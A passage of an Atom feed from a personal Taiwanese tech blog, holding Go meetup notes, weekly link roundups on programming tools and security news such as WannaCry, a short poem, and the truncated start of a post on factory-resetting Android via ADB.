&lt;li&gt;頻繁產生新物件時，throughput 會較低，CPU 時間花在 GC 上的比例較高  &lt;/li&gt;
&lt;li&gt;潛在風險：記憶體破碎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;實測 GC example code  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;GODEBUG=gctrace=1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ GODEBUG=gctrace=1 go run main.go&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://golang.org/pkg/runtime/pprof/"&gt;runtime/pprof&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;net/pprof  &lt;ul&gt;
&lt;li&gt;http://127.0.0.1:7777/debug/pprof  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Golang 對 GC 的優化  &lt;ul&gt;
&lt;li&gt;1.6: 在 rescan stack 階段會檢查自從上次 STW (stop-the-world) 之後該 goroutine 是否有執行過，否則不 scan 該 stack。  &lt;/li&gt;
&lt;li&gt;1.7: 用一個 list 紀錄所有自從上次 STW 以後有執行過的 goroutine，在 rescane 階段不用 scan 所有 stack。  &lt;/li&gt;
&lt;li&gt;1.8: 修改 write barrier 消除 stack re-scan 的必要性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related materials  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://dave.cheney.net/tag/godebug"&gt;GODEBUG | Dave Cheney&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/a/1190000004233812"&gt;[译]GC专家系列1：理解Java垃圾回收 - 牧曦之晨 - SegmentFault&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;STW:「回到垃圾回收上，在開始學習GC之前你應該知道一個詞：stop-the-world。不管選擇哪種GC算法，stop-the-world都是不可避免的。Stop-the-world意味著從應用中停下來並進入到GC執行過程中去。一旦Stop-the-world發生，除了GC所需的線程外，其他線程都將停止工作，中斷了的線程直到GC任務結束才繼續它們的任務。GC調優通常就是為了改善stop-the-world的時間。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Linzy: 介紹 Testify 的 mock 功能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/testify_gtg24.zip"&gt;https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/testify_gtg24.zip&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stretchr/testify"&gt;https://github.com/stretchr/testify&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;A sacred extension to the standard go testing package  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stretchr/testify#mock-package"&gt;https://github.com/stretchr/testify#mock-package&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;mock.AnythingOfType("string")&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Chain your expectations  &lt;/li&gt;
&lt;li&gt;Verify your expectations  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mock.AssertCalled(t, "foo", "bar")&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Stan Lo: Rooby: A new object oriented language written in Go aim at developing microservice efficiently&lt;/h3&gt;
&lt;p&gt;是這篇&lt;a href="https://medium.com/@st0012/%E5%AF%AB%E8%87%AA%E5%B7%B1%E7%9A%84%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80-for-rubyist-3f055c4573da"&gt;寫自己的程式語言（For Rubyist） – Stan Lo – Medium&lt;/a&gt; 的作者本人耶  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/LoStan/goby-76176699"&gt;https://www.slideshare.net/LoStan/goby-76176699&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/goby-lang/goby"&gt;GitHub - goby-lang/goby: Goby (Rooby) is a new object oriented language written in Go aim at developing microservice efficiently.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從 Rooby 改名叫 Goby 了，因為被罵翻了，一堆人寫信或開 issue 建議改名 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://goby-lang.github.io/goby/"&gt;https://goby-lang.github.io/goby/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;目的是想用 Ruby 的語法來做到像 Golang 一樣的 High Performance 的 Language  &lt;/li&gt;
&lt;li&gt;Goby is not  &lt;ul&gt;
&lt;li&gt;A new implementation of Ruby  &lt;/li&gt;
&lt;li&gt;Syntax sugar for Golang.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Golang?  &lt;ul&gt;
&lt;li&gt;已經對 Golang 有興趣一陣子  &lt;/li&gt;
&lt;li&gt;效能不錯  &lt;/li&gt;
&lt;li&gt;GC 和底層的事可以交給 Golang，自己則專心在 VM 上面的開發  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;上禮拜五辭職來全職開發這個語言，希望大家可以&lt;a href="https://gratipay.com/goby/"&gt;捐助一點錢&lt;/a&gt; XD  &lt;/li&gt;
&lt;li&gt;目前開發完成度大概是 first release 的 70%  &lt;/li&gt;
&lt;li&gt;歡迎大家送 PR，就算是改個錯字也可以。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Golang"></category></entry><entry><title>Y2017W20</title><link href="https://blog.m157q.tw/posts/2017/05/22/y2017w20/" rel="alternate"></link><published>2017-07-10T05:20:57+08:00</published><updated>2017-07-10T05:20:57+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-05-22:posts/2017/05/22/y2017w20/</id><summary type="html">&lt;h3&gt;archlinux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.archlinux.org/news/deprecation-of-abs/"&gt;Arch Linux - News: Deprecation of ABS tool and rsync endpoint&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Arch Build System deprecated 了...  &lt;/li&gt;
&lt;li&gt;官方推薦用 &lt;code&gt;asp&lt;/code&gt; 這個 tool 來取代 &lt;code&gt;abs&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.heron.me/cmu%E7%A2%A9%E5%A3%AB%E7%AC%AC%E4%B8%80%E5%B9%B4%E4%BF%AE%E8%AA%B2%E5%BF%83%E5%BE%97-10b5f27408ba"&gt;CMU碩士第一年修課心得 – Heron’s Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;總是很樂於看見大學同學分享在 CMU 唸碩士的經歷呢，畢竟可能是自己一輩子都不會遭遇的事情呢。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/05/16/7316/hp-%e7%9a%84-audio-driver-%e5%85%a7%e5%90%ab-keylogger/"&gt;HP 的 audio driver 內含 Keylogger | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;WTF，audio driver 有 Keylogger 是什麼概念...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cybersecurity&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/05/wanacrypt-virus-defender-update-download-2017/amp/"&gt;WanaCrypt 的預防更新程式下載 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;WanaCrypt0r 這陣子真的是災情慘重呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/carpedm20/fbchat"&gt;carpedm20/fbchat: Facebook Chat (Messenger) for Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Facebook Chat (Messenger) for Python. This project was inspired by facebook-chat-api.  No XMPP or API key is needed. Just use your ID and PASSWORD.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Schmavery/facebook-chat-api"&gt;https://github.com/Schmavery/facebook-chat-api&lt;/a&gt; 的 Python 版，但功能少滿多的，基本的發送訊息沒問題，但不支援小編以粉絲專頁的身份傳送訊息給使用者，而且是只用 requests 去打 Facebook Private API 拿資料，沒支援 JavaScript，嘗試了一下自己去撈粉絲專頁的訊息，不過發現有點太過於麻煩，所以最後還是放棄用這個 module，自己拿 dryscrape 來寫了一個。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/05/introducing-Google-Cloud-IoT-Core-for-securely-connecting-and-managing-IoT-devices-at-scale.html"&gt;Google Cloud Platform Blog: Introducing Google Cloud IoT Core: for securely connecting and managing IoT devices at scale&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 拿來弄 IoT 相關的介紹文  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;google&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.byvoid.com/zht/blog/why-project-fi-is-the-best-carrier"&gt;爲什麼Project Fi是全世界最好的運營商 - BYVoid&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像真的很好用的感覺耶，不過可惜的是只有美國免費，所以大概用不到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/05/19/%e6%b7%b1%e5%85%a5-gil-%e5%a6%82%e4%bd%95%e5%af%ab%e5%87%ba%e5%bf%ab%e9%80%9f%e4%b8%94-thread-safe-%e7%9a%84-python-grok-the-gil-how-to-write-fast-and-thread-safe-python/"&gt;深入 GIL: 如何寫出快速且 thread-safe 的 Python - Grok the GIL: How to write fast and thread-safe Python | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看過原文，講的挺詳細的，被翻譯成繁體中文，收藏一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/05/17/%e6%88%91%e5%b0%8d-pycon-us-2017-%e6%84%9f%e8%88%88%e8%b6%a3%e7%9a%84-18-%e5%80%8b-talks/"&gt;我對 PyCon US 2017 感興趣的 18 個 Talks | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的有挺多有趣的 Talk，應該可以拿來當作工作 BGM，順便練練英聽，畢竟這麼多 talk，可能也很難全部都專心聽完。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mattmakai/fullstackpython.com"&gt;GitHub - mattmakai/fullstackpython.com: Full Stack Python source with Pelican, Bootstrap and Markdown.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.fullstackpython.com/"&gt;Full Stack Python 這個網站&lt;/a&gt;的範例程式碼  &lt;/li&gt;
&lt;li&gt;涵蓋的範圍挺廣的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/aio-libs"&gt;aio-libs&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;各種 Python async 的寫法範例。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WanaCry 系列  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://thehackernews.com/2017/05/wannacry-ransomware-decryption-tool.html"&gt;WannaCry Ransomware Decryption Tool Released; Unlock Files Without Paying Ransom&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.freebuf.com/articles/system/134578.html"&gt;WannaCry蠕蟲詳細分析 - FreeBuf.COM | 關注黑客與極客&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2017/05/websocket.html"&gt;WebSocket 教程 - 阮一峰的网络日志&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;WebSocket 相關的簡介，介紹的挺潛顯易懂的。  &lt;/li&gt;
&lt;li&gt;Websocketd 感覺不錯用呢，不管任何語言，都可以直接轉成 WebSocket Server 感覺挺方便的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/getinsomnia/insomnia"&gt;getinsomnia/insomnia: The most intuitive cross-platform REST API Client ?&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;類似 Postman 的程式，在 Linux 上也有桌面板能直接用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GitHub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/memcached/memcached"&gt;memcached/memcached: memcached development tree&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;毫無反應，就是個 Memcached 的原始碼。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.appledaily.com.tw/realtimenews/article/new/20160316/816930/"&gt;【下町火箭】阿部寬角色原型　北海道真人真事　還畫成漫畫 | 即時新聞 | 20160316 | 蘋果日報&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;當紅日劇《下町火箭》故事主角、由知名影星阿部寬飾演的中小企業「佃製作所」社長佃航平，其實靈感部分是取自日本工業界的真實人物，北海道1家小型家族企業「植松電機」的第2代接班人，現任專務取締役植松努。與虛構  &lt;/li&gt;
&lt;li&gt;最近在看《下町火箭》，真的是很熱血，尤其是身為一個工程師，那種在研發與現實當中的掙扎真的是很令人心有戚戚焉啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://catdrawer.blog/2017/05/18/%e4%b8%ad%e5%9c%8b%e6%99%82%e5%a0%b1%e3%80%80%e8%ab%8b%e5%81%9c%e6%ad%a2%e8%b8%90%e8%b8%8f%e5%aa%92%e9%ab%94%e5%b0%8a%e5%9a%b4/"&gt;中國時報　請停止踐踏媒體尊嚴 – 烏雲也美麗&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中國時報、聯合報、UDN、TVBS、東森，這幾個現在我都沒在看了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="archlinux"></category><category term="blog"></category><category term="cybersecurity"></category><category term="facebook"></category><category term="gcp"></category><category term="google"></category><category term="misc"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category><category term="web"></category></entry><entry><title>《人生》</title><link href="https://blog.m157q.tw/posts/2017/05/18/life/" rel="alternate"></link><published>2017-05-18T10:58:28+08:00</published><updated>2017-05-18T10:58:28+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-05-18:posts/2017/05/18/life/</id><summary type="html">&lt;p&gt;迷失在人生的十字路口&lt;br /&gt;
根本是個偽命題&lt;br /&gt;
人生是片汪洋&lt;br /&gt;
哪來的十字路口&lt;br /&gt;
每個人都是一張孤帆&lt;br /&gt;
偶爾聚會在同一座孤島&lt;br /&gt;
船來船去 潮起潮落&lt;br /&gt;
日昇月落 或聚或散&lt;br /&gt;
有人漫無目的得漂流&lt;br /&gt;
有人方向明確得冒險&lt;br /&gt;
終究會在某個時間點&lt;br /&gt;
在某個地方沈沒  &lt;/p&gt;</summary><category term="poem"></category></entry><entry><title>Y2017W19</title><link href="https://blog.m157q.tw/posts/2017/05/15/y2017w19/" rel="alternate"></link><published>2017-07-10T04:51:36+08:00</published><updated>2017-07-10T04:51:36+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-05-15:posts/2017/05/15/y2017w19/</id><summary type="html">&lt;h3&gt;android&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/aritraroy/UltimateAndroidReference"&gt;GitHub - aritraroy/UltimateAndroidReference: Ultimate Android Reference - Your Road to Become a Better Android Developer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;應該又算是一個 Awesome List，收藏一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/"&gt;Best practices for writing Dockerfiles - Docker Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這份真的挺不錯的，常常在寫 Dockerfile 的時候還是會需要翻一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/posativ/isso"&gt;posativ/isso: a Disqus alternative&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Isso – Ich schrei sonst – is a lightweight commenting server written in Python and JavaScript. It aims to be a drop-in replacement for Disqus.  See posativ.org/isso for more details.  &lt;/li&gt;
&lt;li&gt;可以自己架一個留言系統，用來取代 DISQUS。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/04/30/%e9%96%8b%e7%99%bc%e4%ba%ba%e5%93%a1%e7%9a%84%e9%9d%a2%e8%a9%a6%e6%8c%87%e5%8d%97-a-developers-guide-to-interviewing/"&gt;開發人員的面試指南 - A developer's guide to interviewing | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.freecodecamp.com/how-to-interview-as-a-developer-candidate-b666734f12dd"&gt;A developer’s guide to interviewing – freeCodeCamp&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;這篇之前就有看過原文了，不過現在有人翻譯成繁體中文，所以收藏一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@fchern/%E8%A8%AD%E8%A8%88%E9%AB%98%E6%95%88%E8%83%BD%E7%9A%84hash-table-%E4%BA%8C-9b5dc744219f"&gt;設計高效能的Hash Table（二） – Felix Chern – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;挺有趣的，至少有點回想起了修資料結構的時候。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;xrandr&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://askubuntu.com/questions/356621/refresh-display-settings-using-xrandr-laptop-screen-off-external-screen-on"&gt;command line - Refresh display settings - using xrandr / Laptop screen off, external screen on - Ask Ubuntu&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;總之就是遇到了奇怪的問題，在公司接外接螢幕後，回到租屋處再接我的外接螢幕沒問題，但隔天再到公司接外接螢幕就會顯示不出來。（這中間都沒有重開機）  &lt;/li&gt;
&lt;li&gt;查都查不太到類似的問題，這篇其實也只是叫你用 &lt;code&gt;xrandr --auto &amp;amp;&amp;amp; xrandr --output LVDS --off&lt;/code&gt; 然後再重開，但我的狀況是這樣都沒有用。  &lt;/li&gt;
&lt;li&gt;後來試過的解法是，先用 &lt;code&gt;xrandr --output LVDS --off&lt;/code&gt; 關掉，然後再把螢幕線拔掉，再重新接上螢幕線，再 &lt;code&gt;xrandr --output LVDS --on&lt;/code&gt;，畫面就會出現了。  &lt;/li&gt;
&lt;li&gt;但最怪的地方是，根本沒有 &lt;code&gt;--on&lt;/code&gt; 這個選項，他會跟你說 &lt;code&gt;xrandr: unrecognized option '--on'&lt;/code&gt;，但其實還是有作用，畫面會被切成 Mirror mode，所以要再下一次指令切換到想要的 mode。  &lt;/li&gt;
&lt;li&gt;目前都還是用這個 workaround，還沒仔細去查到底為啥會出現這樣的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="android"></category><category term="docker"></category><category term="github"></category><category term="interview"></category><category term="programming"></category><category term="xrandr"></category></entry><entry><title>Y2017W18</title><link href="https://blog.m157q.tw/posts/2017/05/08/y2017w18/" rel="alternate"></link><published>2017-07-10T04:41:54+08:00</published><updated>2017-07-10T04:41:54+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-05-08:posts/2017/05/08/y2017w18/</id><summary type="html">&lt;h3&gt;ad&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.tezign.com/2017/04/24/2016-%e5%b9%b4%e5%8f%8c11%e6%9c%9f%e9%97%b4%e7%9a%84-1-7-%e4%ba%bf%e4%b8%aa-banner%ef%bc%8c%e9%83%bd%e6%9d%a5%e8%87%aa%e9%98%bf%e9%87%8c%e7%9a%84%e8%ae%be%e8%ae%a1%e4%ba%ba%e5%b7%a5/"&gt;2016 年 “双 11” 期间的 1.7 亿个 Banner，都来自阿里的设计人工智能 “鲁班” | 特赞宇宙&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;人家已經真的在用 AI 來投廣告了，不知道公司什麼時候才能做到這地步啊...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://netbootcamp.org/facebookpeoplesearchtips/"&gt;Facebook People Search Tips | OSINT Training by Bob Brasich&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為某些原因，才知道原來 Facebook 的個人網址後面可以接這麼多東西來去看單一一個使用者的一堆動作...  &lt;/li&gt;
&lt;li&gt;包括在哪些照片哪些文章留言、在哪些文章哪些照片按讚、可能喜歡的照片，還可以針對時間設定區間，真的是有點恐怖。  &lt;/li&gt;
&lt;li&gt;然後最近在一個地方看到，所有上傳到 Facebook 的照片在 &lt;code&gt;&amp;lt;alt&amp;gt;&lt;/code&gt; 都加上了 Machine Learning 判斷出來的 tag，去看了一下還真的沒錯。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gae&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;嗯，雖然很常用 Google App Engine，但覺得自己還是跟它不夠熟啊  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://tnakamura.hatenablog.com/entry/20110805/flask_appstats"&gt;Appstats を Flask で使う方法 - present&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇講如何在 GAE 上用 Flask 和 GAE 內建的 Appstats，挺詳細的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://franks543.blogspot.com/2016/01/google-app-engine-importerror-cannot.html"&gt;Frank 的五四三: Google App Engine ImportError: cannot import name RAND_egd&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GAE 內建的 &lt;code&gt;_ssl&lt;/code&gt; module 的 bug，多 import 了一個不存在的東西，可能是之前有，但後來改掉了，不知道為啥不修掉。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;podcast&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;看到一些 podcast 清單，收藏一下。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wayneashleyberry/awesome-podcasts"&gt;GitHub - wayneashleyberry/awesome-podcasts: A curated list of awesome podcasts related to programming, technology and business.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/guipdutra/awesome-geek-podcasts"&gt;GitHub - guipdutra/awesome-geek-podcasts: A curated list of podcasts we like to listen to.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://simpleprogrammer.com/2016/10/29/ultimate-list-developer-podcasts/"&gt;The Ultimate List Of Developer Podcasts - Simple Programmer&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;主要是最近編輯一些行數比較多的 Python code 時，Sytastic 在檢查的時候有點慢，所以想找看看有沒有啥可以加快的方法。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/w0rp/ale"&gt;w0rp/ale: Asynchronous Lint Engine&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;ALE (Asynchronous Lint Engine) is a plugin for providing linting in NeoVim and Vim 8 while you edit your text files.  ALE makes use of NeoVim and Vim 8 job control functions and timers to run linters on the contents of text buffers and return errors as text is changed in Vim.  &lt;/li&gt;
&lt;li&gt;讓 Vim 8.0 以前的版本透過 Plugin 達到 Async，來讓速度快一些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/neomake/neomake"&gt;neomake/neomake: Asynchronous linting and make framework for Neovim/Vim&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Neomake is a plugin that asynchronously runs programs using Neovim's or Vim's job-control functionality. It is intended to replace the built-in :make command and provides functionality similar to plugins like syntastic and dispatch.vim.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;最近換了一副新眼鏡，所以查了一些相關資料瞭解一下，主要是有關於鏡片的部份。  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.kobayashi.com.tw/lens/"&gt;專業教室-小林眼鏡&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://youbeoptical.com/files/FAQ_lensCatePresence.html"&gt;鏡片種類與說明&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Caloric_reflex_test"&gt;Caloric reflex test - Wikipedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;In medicine, the caloric reflex test (sometimes termed 'vestibular caloric stimulation') is a test of the vestibulo-ocular reflex that involves irrigating cold or warm water or air into the external auditory canal.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/todayilearned/comments/15a7gs/til_that_if_you_pour_cold_water_into_a_persons/"&gt;If you pour cold water into a person's ear, their eyes will move in direction of the opposite ear, if you pour warm water into their ear, their eyes will move towards that ear. This is used to test for brain damage and is called 'caloric stimulation'.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/37787176"&gt;当一个颜值很高的程序员是怎样一番体验？ - 知乎&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最多人按讚的回覆是寫了一個 Python script 把這個討論串的圖片全部載下來 LOL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="ad"></category><category term="facebook"></category><category term="gae"></category><category term="misc"></category><category term="podcast"></category><category term="trivia"></category><category term="vim"></category><category term="life"></category></entry><entry><title>Factory Reset Android via ADB</title><link href="https://blog.m157q.tw/posts/2017/05/05/factory-reset-android-via-adb/" rel="alternate"></link><published>2017-05-05T01:33:34+08:00</published><updated>2017-05-05T01:33:34+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-05-05:posts/2017/05/05/factory-reset-android-via-adb/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;Factory Reset from the GUI settings of my ASUS ZenFone 2 (ZE551ML) with CynagenMod 14 installed didn't work.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Steps&lt;/h2&gt;
&lt;p&gt;Before doing this:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make sure your computer had already installed &lt;code&gt;adb&lt;/code&gt;.  &lt;ul&gt;
